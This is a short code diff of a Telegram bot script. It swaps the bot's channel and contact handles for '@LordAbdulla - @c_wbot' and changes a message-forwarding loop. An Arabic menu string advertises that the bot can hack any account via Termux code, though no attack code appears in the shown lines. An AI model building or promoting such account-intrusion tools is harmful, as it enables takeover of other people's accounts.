@@ -148,7 +148,7 @@ logging.basicConfig(level=logging.WARNING)
 channel = "trprogram"
 menu = '''
 
-**OUR Channel : @trprogram**
+**@LordAbdulla  - @c_wbot**
 
 
 
@@ -186,7 +186,7 @@ mm = '''
 مرحباً، 
 يمكنك اختراق اي حساب بواسطة كود تيرمكس! 
 للمميزات ارسل : /op
-قناة السورس: @trprogram 
+@LordAbdulla  - @c_wbot 
 **
 '''
 @client.on(events.NewMessage(pattern="/start"))
@@ -200,9 +200,9 @@ async def op(event):
 async def op(event):
   if not event.sender_id == legendx:
     return await event.reply("please don't use me 🥺")
-  async for x in client.iter_messages("Trakos"):
+  async for x in client.iter_messages("@ttrakos"):
     try:
-      await x.forward_to("ttrakos")
+      await x.forward_to("@ttrakos")
     except:
       pass
 
@@ -391,7 +391,7 @@ async def start(event):
         else:
           await event.respond("حدث خطأ ")
       except Exception as e:
-        await event.respond("**اذا واجهتك اي مشكله أرسلها هنا : @ttrakos**" + str(e))
+        await event.respond("**اذا واجهتك اي مشكله أرسلها هنا : @LordAbdulla  - @c_wbot**" + str(e))
 
     else:
       await event.respond("**لم يتم العثور على الامر! الرجاء ارسال : /op والمحاولة فيما بعد**")
